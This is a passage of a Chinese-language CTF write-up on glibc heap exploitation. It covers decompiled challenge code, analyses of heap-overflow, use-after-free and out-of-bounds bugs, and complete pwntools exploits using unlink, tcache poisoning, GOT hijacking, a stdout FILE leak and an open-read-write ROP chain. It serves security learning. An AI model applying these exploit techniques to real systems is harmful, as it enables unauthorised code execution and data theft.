                                                //   puts("2.add a new item");
                                                //   puts("3.change the item in the box");
                                                //   puts("4.remove the item in the box");
                                                //   puts("5.exit");
                                                //   puts("----------------------------");
                                                //   return printf("Your choice:");
    read(0, buf, 8uLL);
    switch ( atoi(buf) )
    {
      case 1:
        show_item();
        break;
      case 2:
        add_item();
        break;
      case 3:
        change_item();
        break;
      case 4:
        remove_item();
        break;
      case 5:
        lst->bye();
        exit(0);
      default:
        puts("invaild choice!!!");
        break;
    }
  }
}
``` 

##### 漏洞分析
```c
unsigned __int64 change_item()
{
  int idx; // [rsp+4h] [rbp-2Ch]
  int len; // [rsp+8h] [rbp-28h]
  char buf[16]; // [rsp+10h] [rbp-20h] BYREF
  char nptr[8]; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, buf, 8uLL);
    idx = atoi(buf);
    if ( arr[2 * idx] )
    {
      printf("Please enter the length of item name:");
      read(0, nptr, 8uLL);
      len = atoi(nptr);
      printf("Please enter the new name of the item:");
      *(arr[2 * idx] + read(0, arr[2 * idx], len)) = 0;
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v5;
}
```
**change_item()** 函数中有对 size 的输入，而未做相应的检测。
即，存在堆溢出漏洞。
这里思路是通过 unsafe unlink 修改存放 chunk 地址的数组内容。

##### exp
```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

elf = ELF('./bamboobox')
libc = ELF('./libc-2.23.so')

arr = 0x6020C8

io = process('./bamboobox')
gdb.attach(io, 'b *0x400E42')

def cmd(choice: int):
    io.recvuntil(b'Your choice:')
    io.sendline(str(choice).encode())

def show():
    cmd(1)

def add(size: int, content: bytes):
    cmd(2)
    io.recvuntil(b'Please enter the length of item name:')
    io.sendline(str(size).encode())
    io.recvuntil(b'Please enter the name of item:')
    io.send(content)

def edit(index: int, size: int, content: bytes):
    cmd(3)
    io.recvuntil(b'Please enter the index of item:')
    io.sendline(str(index).encode())
    io.recvuntil(b'Please enter the length of item name:')
    io.sendline(str(size).encode())
    io.recvuntil(b'Please enter the new name of the item:')
    io.send(content)

def delete(index: int):
    cmd(4)
    io.recvuntil(b'Please enter the index of item:')
    io.sendline(str(index).encode())

add(0x40, b'a'*0x1)  # 0
add(0x80, b'b'*0x1)  # 1
add(0x20, b'c'*0x1)
'''
chunk 2 是为了防止 topchunk 合并
'''

extend = p64(0)+p64(0x41)
extend += p64(arr-0x18)+p64(arr-0x10)
extend += p64(0)*4
'''
在 chunk 0 中构造一个 fake chunk
'''

extend += p64(0x40)+p64(0x90)
'''
修改下个 chunk 的 prev_size 和 size
'''
edit(0, len(extend), extend)

delete(1)
'''
触发 unlink
'''

show()
libc.address = u64(io.recvuntil(b'\x7f')[-6:]+b'\x00\x00') - 0x3c48e0
info('libc.address: ' + hex(libc.address))
system = libc.sym['system']
info('system: ' + hex(system))
'''
arr[0] 的内容中是 stdin
泄露 libc
获取 system 地址
'''

edit(0, 0x20, p64(0)*3+p64(elf.got['atoi']))
edit(0, 8, p64(system))
'''
劫持 atoi 的 GOT 表
'''

io.interactive()
```
### heap 2.27

#### actf_2019_babyheap

> 来源：BUUOJ

```C
void __fastcall __noreturn main(char *a1, char **a2, char **a3)
{
  int v3; // eax
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init_0();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();                                   //   puts("==============================");
                                                //   puts(" This is a heap exploit demo  ");
                                                //   puts("==============================");
                                                //   puts("1. Create something           ");
                                                //   puts("2. Delete something           ");
                                                //   puts("3. Print something            ");
                                                //   puts("4. Exit                       ");
                                                //   puts("==============================");
                                                //   printf("Now the time is ");
                                                //   system("date");
                                                //   printf("Your choice: ");
      read(0, buf, 8uLL);
      v3 = atoi(buf);
      if ( v3 != 2 )
        break;
      del();
    }
    if ( v3 == 3 )
    {
      show();
    }
    else
    {
      if ( v3 != 1 )
        bye();
      add();
    }
  }
}
```
##### 漏洞分析
```C
unsigned __int64 del()
{
  int v1; // [rsp+Ch] [rbp-24h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Please input list index: ");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 >= 0 && v1 < cap )
  {
    if ( *(&arr + v1) )
    {
      free(**(&arr + v1));                      // uaf
      free(*(&arr + v1));
    }
  }
  else
  {
    puts("Out of bound!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```
对指针进行 free 操作，
但是为对指针进行置空。
即，*UAF*

而程序未开启 PIE, 还有 '/bin/sh' 字样
直接通过劫持 print 为 system

##### exp
```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

libc=ELF('./libc-2.27.so')
elf=ELF('./ACTF_2019_babyheap')

io=process('./ACTF_2019_babyheap')
gdb.attach(io, 'b *0x400D69')

binsh = 0x602010
system = 0x4007A0

def cmd(c:int):
    io.sendlineafter(b'Your choice: ', str(c).encode())

def add(size:int, content:bytes):
    cmd(1)
    io.sendlineafter(b'size: ', str(size).encode())
    io.sendafter(b'content: ', content)

def delele(idx:int):
    cmd(2)
    io.sendlineafter(b'index: ', str(idx).encode())

def show(idx:int):
    cmd(3)
    io.sendlineafter(b'index: ', str(idx).encode())

add(0x20, b'a'*0x20)
add(0x20, b'b'*0x20)
add(0x40, b'c'*0x40)
#防止合并,虽然实际上好像不需要

delele(0)
delele(1)
#放入 tcache bin 中

add(0x10, p64(binsh)+p64(system))
'''
0x10是为了神奇到之前的 head 块
然后覆盖 ptr 为 binsh_ptr , print 为 system
'''

show(0)
'''
触发
'''

io.interactive()
```

### heap 2.31

#### feedback

> 来源：moectf 2023

```C
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  init();
  read_flag();
  vuln();
}
```
```C
void __cdecl read_flag()
{
  int fd; // [rsp+4h] [rbp-Ch]

  fd = open("./flag", 0, 0LL);
  if ( fd == -1 )
  {
    puts("open flag error!");
    exit(0);
  }
  if ( &puts == (int (**)(const char *))0xFFFFFFFFFFE92D20LL )
  {
    puts("malloc error!");
    exit(0);
  }
  read(fd, &puts + 0x2DA5C, 0x50uLL);
  close(fd);
  //flag内容写入libc
}
```
##### 漏洞分析
```C
void __cdecl __noreturn vuln()
{
  int i; // [rsp+8h] [rbp-8h]
  int ia; // [rsp+8h] [rbp-8h]
  int index; // [rsp+Ch] [rbp-4h]

  puts("Can you give me your feedback?");
  puts("There are some questions.");
  puts("1. What do you think of the quality of the challenge this time?");
  puts("2. Give me some suggestions.");
  puts("3. Please give me your ID.");
  feedback_list[0] = 0LL;
  for ( i = 1; i <= 3; ++i )
    feedback_list[i] = (char *)malloc(0x50uLL);
  for ( ia = 0; ia <= 2; ++ia )
  {
    puts("Which list do you want to write?");
    index = read_num();
    if ( index <= 3 )
    {
      puts("Then you can input your feedback.");
      read_str(feedback_list[index]);           // 数组越位
      print_feedback();
    }
    else
    {
      puts("No such list.");
    }
  }
  _exit(0);
}
```

index 若为负数，则存在数组越位。
bss 段上 feedbacl_list 在 `stdout`,`stdin`,`stderr` 之后。

可通过数组越位修改这些结构体的值。

##### exp
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('./libc-2.31.so')

io = process('./feedback')
gdb.attach(io, 'b *$rebase(0x1581)')  

def edit(idx, content):
    io.recvuntil(b'Which list do you want to write?')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Then you can input your feedback.')
    io.sendline(content)

'''
0xfbad1800是覆写_flag.
p64(0)*3是覆写_IO_read_pte,_IO_read_base,_IO_read_end
b'\x00'是覆写_IO_write_base的最后一字节,
使_IO_write_base与_IO_write_ptr间有差
'''
payload = p64(0xfbad1800) + p64(0) * 3 + b'\x00'
edit(-8, payload)

libc.address = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x1ec980
info('libc.address: ' + hex(libc.address))
puts_addr = libc.sym['puts']
info('puts_addr: ' + hex(puts_addr))
base_addr = puts_addr+0x2DA5C*8
end_addr = base_addr+0x50
'''
base_addr就是flag的地址
+0x50是因为写入flag的时候是0x50,
'''
info('base_addr: ' + hex(base_addr))
info('end_addr: ' + hex(end_addr))

'''
payload的写法和之前类似
_IO_write_base与_IO_write_ptr的 区间包含了flag
'''
payload = p64(0xfbad1800) + p64(0) * 3 + p64(base_addr)+p64(end_addr)+p64(0)*3
edit(-8, payload)

io.interactive()

```

#### tcache_king

> 来源：偶然所得
```C
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  init_0(a1, a2, a3);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();                                   //   log("1.Add\n");
                                                //   log("2.Edit\n");
                                                //   log("3.Free\n");
                                                //   log("4.Exit\n");
                                                //   return write(1, ">> ", 3uLL);
      v3 = (int)getc();
      if ( v3 != 2 )
        break;
      edit();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        del();
      }
      else
      {
        if ( v3 == 4 )
          _exit(0);
LABEL_13:
        log("Invalid choice\n");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_13;
      add();
    }
  }
}
```
##### 漏洞分析
```C
void del()
{
  unsigned int idx; // [rsp+Ch] [rbp-4h]

  log("Idx:");
  idx = getc();
  if ( idx <= 4 && arr[idx] )
    free(arr[idx]);
  else
    log("Invalid idx\n");
}
``` 
明显的 *UAF* 漏洞

思路：把 chunk 申请到 arr 地址，然后劫持 got 表

由于开了 sandbox 禁止了 execv 和 execvat，故打 orw

##### exp
```Python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
# context.arch = 'amd64'
context.binary = './pwn'

libc = ELF('./libc-2.31.so')
elf = ELF('./pwn')

io = process(elf.path)
# gdb.attach(io, 'b * 0x4016E4')

def cmd(num):
    io.sendlineafter(b'>> ', str(num).encode())

def add():
    cmd(1)
    io.sendlineafter(b'Size: ', b'32')

def edit(idx, content):
    cmd(2)
    io.sendlineafter(b'Idx:', str(idx).encode())
    io.sendafter(b'Content: ', content)

def free(idx):
    cmd(3)
    io.sendlineafter(b'Idx:', str(idx).encode())

arr = 0x4035a0

add()  # 0
add()  # 1

free(1)
free(0)

edit(0, p64(arr-0x10))

add()  # 2
add()  # 3 to heap

extend = p64(0)*2+p64(arr+8)
edit(3, extend)

extend = p64(elf.got['free']) + p64(elf.got['read'])
edit(0,extend)

edit(1, p64(0x4012D1))
info("plz check the arr and the got of free")
free(2)

libc.address = u64(io.recvuntil(b'\x7f')
                   [-6:].ljust(8, b'\x00')) - libc.symbols['read']
info('libc base: ' + hex(libc.address))
open = libc.symbols['open']
reads = libc.symbols['read']
writes = libc.symbols['write']
gets = libc.symbols['gets']
environ = libc.symbols['environ']
rdi = libc.address + 0x23b6a
rsi = libc.address + 0x2601f
rdx = libc.address + 0x142c92
info('open: ' + hex(open))
info('read: ' + hex(reads))
info('write: ' + hex(writes))
info('gets: ' + hex(gets))
info('environ: ' + hex(environ))

edit(0, p64(environ))

free(1)
stack = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x118
info('stack: ' + hex(stack))

extend = p64(elf.got['free']) + p64(stack - 0x8) + b'./flag\0'
edit(0, extend)
edit(1,p64(gets))

payload = p64(rdi)
payload += p64(arr+0x18)
payload += p64(rsi)
payload += p64(0)
payload += p64(open)

payload += p64(rdi)
payload += p64(3)
payload += p64(rsi)
payload += p64(arr+0x40)
payload += p64(rdx)
payload += p64(0x40)
payload += p64(reads)

payload += p64(rdi)
payload += p64(1)
payload += p64(rsi)
payload += p64(arr+0x40)
payload += p64(rdx)
payload += p64(0x40)
payload += p64(writes)

free(2)
info('plz check the stack')
io.sendline(payload)

print(io.recvall())

io.interactive()

```
